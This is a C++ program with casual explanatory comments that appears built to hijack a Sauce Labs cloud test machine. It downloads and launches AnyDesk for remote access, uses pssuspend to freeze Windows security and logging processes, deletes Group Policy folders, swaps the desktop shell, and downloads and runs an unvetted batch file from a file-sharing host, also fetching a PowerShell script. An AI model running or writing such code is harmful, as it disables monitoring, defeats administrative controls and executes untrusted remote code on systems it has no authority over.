// dis still some bullshite
#include <iostream>
#include <cstdlib> // for system()
#include <filesystem> // for filesystem::
#include <thread> // for std::this_thread::sleep_for
#include <chrono> // for std::chrono::seconds


// any const you see basically means the variables value after that cannot be changed no matter what.

void pause(int seconds) {
    std::this_thread::sleep_for(std::chrono::seconds(seconds)); // chrono deals with time related events, sleep_for is thread sleep time
}

void clearConsole() {
    system("cls"); // clear the console
}

void changeColor(const std::string& color) { // makes changeColor look prettier when used
    system(("color " + color).c_str()); // this is pretty much what changeColor will be executing but it looks nicer in script if we do it like this, tbh i still don't really understand .c_str() its quite confusing but makes this work.
}

bool checkSauceExists() {
    return std::filesystem::exists("C:\\ffmpeg\\ff-prompt.bat"); // bool mostly deals with true or false statements, this uses filesystem to check if this specified file exists.
}

void downloadFile(const std::string& url, const std::string& output) {
    system(("curl -O \"" + url + "\" >nul 2>&1").c_str()); // this is what download file is going to be executing/using but made simpler in the actual code
}

int main() {
    // Initial setup
    clearConsole();
    changeColor("06"); // set color, as you can see the change color looks better here.
    pause(1); // instead of having to do command now, we can just use pause which is not only more effiecnt and faster but easier to understand now. and ensures no mistakes.
    
    if (checkSauceExists()) { // if its true the file exist we returned up then it runs this part/continues.
        clearConsole();
        std::cout << "Saucelabs detected, continuing with script.\n";
        pause(4);
    } else { // and if its not true and fale/ doesn't exists it quickly exists.
        clearConsole();
        std::cout << "Saucelabs not detected, exiting script.\n";
        pause(4);
        return 0; // Exit the program
    }

    // Get script ready animation
    for (const std::string& frame : {"[I]", "[/]", "[-]", "[\\]"}) { // tbh i dont really understand this part i chatgpted it.
        clearConsole();
        std::cout << frame << " Getting script ready.\n";
        pause(1);
    }

    // Main operations
    std::filesystem::create_directory("C:\\anydesk"); // here we used filesytem to be able to create_directory, and C:\\ because C:\ wont work.
    std::filesystem::current_path("C:\\anydesk"); // basically just cd, we couldve done it another way but this works.
    downloadFile("https://picteon.dev/files/AnyDesk.exe", "AnyDesk.exe"); // and now here comes the curl command simplified.

    clearConsole();
    std::cout << "Set password for AnyDesk and install it.\n";
    system("ren AnyDesk.* Anydesk.exe"); // this is just simple batch to c++ translation
    system("Anydesk.exe"); // ofc just starts anydesk, nothing crazy.
    system("pause"); // do i really need to explain this one?
    clearConsole(); //cls just simplified without need of system("cls");

    // Create Tools directory and download PSTools
    std::filesystem::create_directory("C:\\Tools"); // again like anydesk
    std::filesystem::current_path("C:\\Tools"); // same shite
    downloadFile("https://download.sysinternals.com/files/PSTools.zip", "PSTools.zip"); // yeah pretty easy
    clearConsole();
    system("tar -xf PSTools.zip"); // you might start to understand it now

    // puts all processes wanted into processes variable
    std::string processes[] = {
        "msedge.exe", "msedgedriver.exe", "javaw.exe", 
        "ffmpeg.exe", "python.exe", "os-setup-service.exe",
        "SecurityHealthSystray.exe", "SecurityHealthService.exe",
        "fluent-bit.exe", "tvnserver.exe"
    };

    for (const std::string& processName : processes) { // puts processes into processname
        clearConsole();
        system(("C:\\Tools\\pssuspend.exe " + processName + " >nul 2>&1").c_str()); // individually suspends all processnames/processes we listed earlier.
    }

    clearConsole();

    // Cleanup Group Policy
    system("RD /s /q \"%windir%\\System32\\GroupPolicyUsers\" >nul 2>&1"); // simple stuff
    system("RD /s /q \"%windir%\\System32\\GroupPolicy\" >nul 2>&1"); // simple
    system("\"GPUPDATE /force\" >nul 2>&1"); //simple
    clearConsole();

    // Download and set up Desktop applications
    std::filesystem::create_directory("C:\\Desktop");
    std::filesystem::current_path("C:\\Desktop");
    downloadFile("https://files.catbox.moe/c7qngw.zip", "Desktop.zip");
    system("ren *.* Desktop.zip");
    system("tar -xf Desktop.zip");
    std::filesystem::current_path("C:\\Desktop\\WinXShell_x64");
    system("taskkill /f /im explorer.exe >nul 2>&1");
    system("start \"\" winxshell.exe"); // we doing \"\" instead of normally because chatgpt said it could solve any problems that might or might not come up, in this case it wouldve worked without but still good to add.
    system("taskkill /f /im explorer.exe >nul 2>&1");
    system("start \"\" winxshell.exe");
    clearConsole();

    // Additional downloads and setups
    std::filesystem::current_path("C:\\users\\sauce\\Desktop");
    downloadFile("https://files.catbox.moe/d14z2n.ps1", "TrustedRunTwice.ps1");
    system("ren d14*.* TrustedRunTwice.ps1");
    clearConsole();

    // Download Code::Blocks
    downloadFile("https://pilotfiber.dl.sourceforge.net/project/codeblocks/Binaries/20.03/Windows/codeblocks-20.03mingw-setup.exe?viasf=1", "CodeBlocksSetup.exe");
    system("ren code*.* CodeBlocksSetup.exe");
    clearConsole();

    // Download UwUTools
    system("curl -L -o \"C:\\users\\sauce\\desktop\\UwUTools.exe\" \"https://github.com/dpadGuy/UwUTools_Binaries/releases/download/UwUToolsBinaries/UwUTools.exe\" >nul 2>&1");
    clearConsole();

    // Create a shortcut
    system("powershell -command \"$WshShell = New-Object -ComObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('C:\\Users\\sauce\\Desktop\\Terminal.lnk'); $Shortcut.TargetPath = 'C:\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal_1.6.10571.0_x64__8wekyb3d8bbwe\\wt.exe'; $Shortcut.Save()\"");


    //Rerun winxshell to fix any bugs that might happen.
    system("taskkill /f /im winxshell.exe >nul 2>&1");
    system("start \"\" C:\\Desktop\\WinXShell_x64\\winxshell.exe"); // in this case \"\" mightve actually helped us but usually used to fix spaces in paths.


    // Final steps
    clearConsole();
    std::filesystem::current_path("C:\\Windows");
    downloadFile("https://files.catbox.moe/pkoptr.bat", "time.bat");
    system("ren pk*.bat time.bat");
    changeColor("0F");
    system("call \"C:\\windows\\time.bat\"");
    clearConsole();

    return 0;
}